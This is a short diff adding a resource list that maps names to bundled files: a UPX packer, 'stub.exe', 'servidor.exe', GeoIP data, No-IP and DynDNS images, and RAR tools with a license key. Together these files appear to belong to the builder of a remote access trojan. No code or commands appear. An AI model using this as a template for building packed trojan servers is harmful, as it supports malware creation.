@@ -1,0 +1,14 @@
+GEOIP geoipfile xgeoip.dat
+SOUND soundfile Risada_MK2.WAV
+UPX upxfile xupx.exe
+SQLITE sqlitefile Mysqlite3.dll
+STUB stubfile stub.exe
+SERVER serverfile servidor.exe
+LANG langfile lang.ini
+IMGPOPUP imgpopup ImageNotify.jpg
+SKIN skinfile Garnet.asz
+NOIP noipfile noip.jpg
+DYNDNS dyndnsfile dyndns.jpg
+IMGDISCONNECT imgdisconnect Disconnected.jpg
+RAR rarfile rar.exe
+RARREG rarregfile rarreg.key
